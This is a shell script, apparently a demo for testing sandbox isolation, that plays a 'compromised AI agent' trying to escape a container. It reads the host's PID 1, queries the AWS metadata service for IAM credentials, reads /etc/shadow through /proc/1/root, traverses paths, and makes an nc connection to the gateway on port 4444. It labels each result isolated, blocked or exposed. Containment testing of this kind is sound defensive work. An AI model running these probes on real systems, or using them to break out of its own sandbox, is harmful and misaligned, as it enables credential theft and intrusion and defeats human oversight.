#!/bin/sh
echo "============================================"
echo "  COMPROMISED AI AGENT - ESCAPE ATTEMPTS"
echo "============================================"
echo ""
echo "[1] RECON: Who am I and where am I?"
echo "    Hostname: $(hostname)"
echo "    Kernel:   $(uname -r)"
echo "    User:     $(whoami)"
echo ""
echo "[2] HOST PROCESS ENUMERATION"
echo "    Attempting to read /proc/1/cmdline (host init process)..."
PID1_CMD=$(cat /proc/1/cmdline 2>/dev/null | tr '\0' ' ')
if [ -n "$PID1_CMD" ]; then
  echo "    PID 1: $PID1_CMD"
  # Zone typically has 1-5 processes; host has 50+; threshold matches DEMO_01
  PS_COUNT=$(ps aux 2>/dev/null | wc -l)
  PS_COUNT=${PS_COUNT:-0}
  if echo "$PID1_CMD" | grep -q "agent-escape"; then
    echo "    >>> ISOLATED: PID 1 is our own process (zone boundary)"
  elif [ "$PS_COUNT" -lt 10 ]; then
    echo "    >>> ISOLATED: Limited PID namespace (only $PS_COUNT processes visible)"
  else
    echo "    >>> EXPOSED: Can see host PID 1 ($PID1_CMD)"
  fi
else
  echo "    >>> BLOCKED: Cannot read host PID 1"
fi
echo ""
echo "[3] AWS METADATA SERVICE (credential theft)"
echo "    Attempting to reach 169.254.169.254..."
if wget -q -O - --timeout=3 http://169.254.169.254/latest/meta-data/iam/ 2>/dev/null; then
  echo ""
  echo "    >>> EXPOSED: Can reach instance metadata (IAM role theft possible)"
else
  echo "    >>> BLOCKED: Metadata service unreachable"
fi
echo ""
echo "[4] HOST NETWORK SCANNING"
echo "    Attempting to reach host gateway..."
GATEWAY=$(ip route 2>/dev/null | awk '/default/{print $3}')
if [ -n "$GATEWAY" ]; then
  echo "    Gateway: $GATEWAY"
  if wget -q -O /dev/null --timeout=3 "http://${GATEWAY}:80" 2>/dev/null; then
    echo "    >>> EXPOSED: Can reach host network"
  else
    echo "    >>> Limited: Gateway visible but services unreachable"
  fi
else
  echo "    >>> BLOCKED: No gateway route found"
fi
echo ""
echo "[5] HOST FILESYSTEM ACCESS"
echo "    Attempting to read /etc/shadow via /proc/1/root..."
DIRECT_SHADOW=$(cat /etc/shadow 2>/dev/null | head -3)
TRAVERSED_SHADOW=$(cat /proc/1/root/etc/shadow 2>/dev/null | head -3)
if [ -n "$TRAVERSED_SHADOW" ]; then
  echo "$TRAVERSED_SHADOW" | sed 's/^/    /'
  if [ "$DIRECT_SHADOW" = "$TRAVERSED_SHADOW" ]; then
    echo "    >>> ISOLATED: /proc/1/root loops back to own filesystem (zone boundary)"
  elif echo "$TRAVERSED_SHADOW" | grep -qE ':\$[0-9a-z]+\$'; then
    echo "    >>> EXPOSED: Real password hashes found (host shadow file)"
  else
    echo "    >>> ISOLATED: Minimal shadow file (zone's own filesystem, not the host)"
  fi
else
  echo "    >>> BLOCKED: Cannot traverse to host filesystem"
fi
echo ""
echo "[6] CONTAINER ESCAPE via /proc/self/root"
echo "    Attempting path traversal to host..."
TRAVERSED_HOSTNAME=$(cat /proc/self/root/proc/self/root/etc/hostname 2>/dev/null)
if [ -n "$TRAVERSED_HOSTNAME" ]; then
  OWN_HOSTNAME_FILE=$(cat /etc/hostname 2>/dev/null)
  echo "    /etc/hostname:          ${OWN_HOSTNAME_FILE:-<empty>}"
  echo "    Traversed /etc/hostname: $TRAVERSED_HOSTNAME"
  if [ "$TRAVERSED_HOSTNAME" = "$OWN_HOSTNAME_FILE" ]; then
    echo "    >>> ISOLATED: Path traversal loops back to own filesystem (zone boundary)"
  else
    echo "    >>> EXPOSED: Reached a different filesystem ($TRAVERSED_HOSTNAME)"
  fi
else
  echo "    >>> BLOCKED: Path traversal failed"
fi
echo ""
echo "[7] KERNEL EXPLOIT SURFACE"
echo "    Checking if kernel matches host (shared kernel = shared exploits)..."
MY_KERNEL=$(uname -r)
echo "    Container kernel: $MY_KERNEL"
echo "    /proc/version:    $(cat /proc/version 2>/dev/null | cut -c1-60)"
HYPERVISOR=$(cat /sys/hypervisor/type 2>/dev/null || echo "")
if [ -n "$HYPERVISOR" ]; then
  echo "    Hypervisor:       $HYPERVISOR"
  echo "    >>> ISOLATED: Running in a VM with own kernel (zone boundary)"
else
  PS_COUNT=$(ps aux 2>/dev/null | wc -l)
  if [ "${PS_COUNT:-0}" -gt 10 ]; then
    echo "    >>> EXPOSED: Running host's kernel (shared attack surface)"
  else
    echo "    >>> ISOLATED: Running a different kernel than the host"
  fi
fi
echo ""
echo "[8] REVERSE SHELL ATTEMPT"
echo "    Attempting outbound connection to host on port 4444..."
GATEWAY=$(ip route 2>/dev/null | awk '/default/{print $3}')
if [ -n "$GATEWAY" ]; then
  if echo "agent-exfil-test" | nc -w 3 "$GATEWAY" 4444 2>/dev/null; then
    echo "    >>> EXPOSED: Outbound connection succeeded"
  else
    echo "    >>> BLOCKED: Outbound connection failed"
  fi
else
  echo "    >>> BLOCKED: No gateway route found"
fi
echo ""
echo "============================================"
echo "  ASSESSMENT COMPLETE"
echo "============================================"
